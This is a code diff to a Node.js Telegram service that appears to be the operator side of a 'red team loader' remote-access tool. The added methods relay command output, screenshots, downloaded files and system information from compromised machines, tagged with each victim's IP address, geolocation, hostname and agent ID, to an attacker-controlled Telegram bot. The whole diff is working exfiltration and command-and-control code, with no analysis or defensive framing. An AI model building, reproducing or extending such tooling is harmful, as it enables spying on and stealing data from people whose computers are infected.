@@ -1,6 +1,7 @@
 const axios = require('axios');
 const fs = require('fs').promises;
 const path = require('path');
+const FormData = require('form-data');
 const geoLocationService = require('./geoLocationService');
 
 class TelegramService {
@@ -275,22 +276,215 @@ ${locationInfo}${clientInfo}📢 **Message:** ${message}
   }
 
   /**
-   * Send custom notification
-   * @param {string} title - Notification title
-   * @param {string} message - Notification message
-   * @param {Object} data - Additional data
+   * Send command output to Telegram
+   * @param {Object} clientInfo - Client information
+   * @param {string} command - Command executed
+   * @param {string} output - Command output
+   * @param {string} outputType - Type of output (text, screenshot, file, system-info)
    */
-  async sendCustomNotification(title, message, data = {}) {
-    const customMessage = `🔴 **RED TEAM LOADER**
+  async sendCommandOutput(clientInfo, command, output, outputType = 'text') {
+    if (!this.isEnabled()) {
+      console.log('Telegram notifications disabled or not configured');
+      return;
+    }
 
-🎯 **${title}**
-${message}
+    try {
+      const timestamp = new Date().toLocaleString();
+      const geoInfo = clientInfo.geoLocation || await geoLocationService.getLocationInfo(clientInfo.ipAddress);
+      const flag = geoLocationService.getFlagEmoji(geoInfo.countryCode);
+      const location = geoLocationService.formatLocation(geoInfo);
 
-⏰ **Time:** ${new Date().toLocaleString()}
+      let message = `🔴 **RED TEAM ALERT**
 
-${data.additional ? data.additional : ''}`;
+📋 **Command Executed**
+${flag} **Location:** \`${location}\`
+📍 **IP Address:** \`${clientInfo.ipAddress}\`
+🖥️ **Hostname:** \`${clientInfo.computerName || 'Unknown'}\`
+🆔 **Agent ID:** \`${clientInfo.uuid}\`
 
-    await this.sendMessage(customMessage);
+💻 **Command:** \`${command}\`
+📊 **Output Type:** ${outputType}
+⏰ **Executed:** ${timestamp}
+
+`;
+
+      switch (outputType) {
+        case 'screenshot':
+          message += `📸 **Screenshot captured and attached**`;
+          break;
+        case 'file':
+          message += `📁 **File downloaded and attached**`;
+          break;
+        case 'system-info':
+          message += `ℹ️ **System Information:**\n\`\`\`\n${output}\n\`\`\``;
+          break;
+        case 'text':
+        default:
+          message += `📝 **Output:**\n\`\`\`\n${output}\n\`\`\``;
+          break;
+      }
+
+      await this.sendMessage(message);
+    } catch (error) {
+      console.error('Error sending command output to Telegram:', error);
+    }
+  }
+
+  /**
+   * Send screenshot to Telegram
+   * @param {Object} clientInfo - Client information
+   * @param {Buffer} imageBuffer - Image buffer
+   * @param {string} caption - Caption for the image
+   */
+  async sendScreenshot(clientInfo, imageBuffer, caption = '') {
+    if (!this.isEnabled()) {
+      console.log('Telegram notifications disabled or not configured');
+      return;
+    }
+
+    try {
+      const timestamp = new Date().toLocaleString();
+      const geoInfo = clientInfo.geoLocation || await geoLocationService.getLocationInfo(clientInfo.ipAddress);
+      const flag = geoLocationService.getFlagEmoji(geoInfo.countryCode);
+      const location = geoLocationService.formatLocation(geoInfo);
+
+      const message = `🔴 **RED TEAM ALERT**
+
+📸 **Screenshot Captured**
+${flag} **Location:** \`${location}\`
+📍 **IP Address:** \`${clientInfo.ipAddress}\`
+🖥️ **Hostname:** \`${clientInfo.computerName || 'Unknown'}\`
+🆔 **Agent ID:** \`${clientInfo.uuid}\`
+
+⏰ **Captured:** ${timestamp}
+${caption ? `📝 **Note:** ${caption}` : ''}`;
+
+      // Send photo with caption
+      const formData = new FormData();
+      formData.append('chat_id', this.config.chatId);
+      formData.append('photo', imageBuffer, {
+        filename: `screenshot_${clientInfo.uuid}_${Date.now()}.png`,
+        contentType: 'image/png'
+      });
+      formData.append('caption', message);
+      formData.append('parse_mode', 'Markdown');
+
+      const response = await axios.post(
+        `https://api.telegram.org/bot${this.config.botToken}/sendPhoto`,
+        formData,
+        {
+          headers: {
+            'Content-Type': 'multipart/form-data'
+          }
+        }
+      );
+
+      if (response.data.ok) {
+        console.log('Screenshot sent to Telegram successfully');
+        return response.data;
+      } else {
+        console.error('Telegram API error:', response.data);
+      }
+    } catch (error) {
+      console.error('Error sending screenshot to Telegram:', error);
+    }
+  }
+
+  /**
+   * Send file to Telegram
+   * @param {Object} clientInfo - Client information
+   * @param {string} fileName - Name of the file
+   * @param {Buffer} fileBuffer - File buffer
+   * @param {string} caption - Caption for the file
+   */
+  async sendFile(clientInfo, fileName, fileBuffer, caption = '') {
+    if (!this.isEnabled()) {
+      console.log('Telegram notifications disabled or not configured');
+      return;
+    }
+
+    try {
+      const timestamp = new Date().toLocaleString();
+      const geoInfo = clientInfo.geoLocation || await geoLocationService.getLocationInfo(clientInfo.ipAddress);
+      const flag = geoLocationService.getFlagEmoji(geoInfo.countryCode);
+      const location = geoLocationService.formatLocation(geoInfo);
+
+      const message = `🔴 **RED TEAM ALERT**
+
+📁 **File Downloaded**
+${flag} **Location:** \`${location}\`
+📍 **IP Address:** \`${clientInfo.ipAddress}\`
+🖥️ **Hostname:** \`${clientInfo.computerName || 'Unknown'}\`
+🆔 **Agent ID:** \`${clientInfo.uuid}\`
+
+📄 **File:** \`${fileName}\`
+⏰ **Downloaded:** ${timestamp}
+${caption ? `📝 **Note:** ${caption}` : ''}`;
+
+      // Send document with caption
+      const formData = new FormData();
+      formData.append('chat_id', this.config.chatId);
+      formData.append('document', fileBuffer, {
+        filename: fileName,
+        contentType: 'application/octet-stream'
+      });
+      formData.append('caption', message);
+      formData.append('parse_mode', 'Markdown');
+
+      const response = await axios.post(
+        `https://api.telegram.org/bot${this.config.botToken}/sendDocument`,
+        formData,
+        {
+          headers: {
+            'Content-Type': 'multipart/form-data'
+          }
+        }
+      );
+
+      if (response.data.ok) {
+        console.log('File sent to Telegram successfully');
+        return response.data;
+      } else {
+        console.error('Telegram API error:', response.data);
+      }
+    } catch (error) {
+      console.error('Error sending file to Telegram:', error);
+    }
+  }
+
+  /**
+   * Send system information to Telegram
+   * @param {Object} clientInfo - Client information
+   * @param {Object} systemData - System information data
+   */
+  async sendSystemInfo(clientInfo, systemData) {
+    if (!this.isEnabled()) {
+      console.log('Telegram notifications disabled or not configured');
+      return;
+    }
+
+    try {
+      const timestamp = new Date().toLocaleString();
+      const geoInfo = clientInfo.geoLocation || await geoLocationService.getLocationInfo(clientInfo.ipAddress);
+      const flag = geoLocationService.getFlagEmoji(geoInfo.countryCode);
+      const location = geoLocationService.formatLocation(geoInfo);
+
+      const message = `🔴 **RED TEAM ALERT**
+
+ℹ️ **System Information**
+${flag} **Location:** \`${location}\`
+📍 **IP Address:** \`${clientInfo.ipAddress}\`
+🖥️ **Hostname:** \`${clientInfo.computerName || 'Unknown'}\`
+🆔 **Agent ID:** \`${clientInfo.uuid}\`
+
+⏰ **Collected:** ${timestamp}
+
+${this.formatSystemInfo(systemData)}`;
+
+      await this.sendMessage(message);
+    } catch (error) {
+      console.error('Error sending system info to Telegram:', error);
+    }
   }
 
   /**
